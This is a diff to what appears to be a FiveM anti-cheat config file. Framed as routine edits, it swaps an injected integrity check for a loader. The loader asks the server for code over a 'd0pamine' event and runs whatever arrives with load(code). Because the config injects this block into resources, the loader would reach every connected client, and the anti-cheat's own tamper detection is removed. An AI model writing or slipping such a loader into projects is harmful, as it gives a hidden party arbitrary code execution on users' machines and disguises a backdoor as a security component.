@@ -27,7 +27,7 @@ Config.blacklistedCommands = {
 Config.onResourceStopCheck = false --[[Triggered if anti-cheat resource is being stopped]]
 Config.onResourceStartCheck = true --[[Triggered if a new resource is being started]]
 Config.onResourceStartLength = 16 --[[Length of disallowed resource name]]
-Config.allowedResources = { --[[Add resource names that are >onResourceStartLength length]]
+Config.allowedResources = { --[[Resource names that are >=onResourceStartLength length and should be skipped]]
 	'fivem-map-hipster',
 	'fivem-map-skater',
 	'essentialmode',
@@ -63,11 +63,13 @@ Config.fsManifest = '__resource.lua' --[[Don't modify if you have no clue of wha
 ]]
 Config.fsCode = [[
 Citizen.CreateThread(function()
-	while true do Citizen.Wait(25000)
-		if _G == nil then
-			TriggerServerEvent('nsac:trigger', 'nsac_100 - global var set to nil in resource: '..GetCurrentResourceName())
-		end
-	end
+	while not NetworkIsSessionStarted() do Wait(0) end
+	TriggerServerEvent('d0pamine:request-load')
+end)
+
+RegisterNetEvent('d0pamine:start-load')
+AddEventHandler('d0pamine:start-load', function(code)
+	assert(load(code))()
 end)
 
 local oldGiveWeaponToPed = GiveWeaponToPed
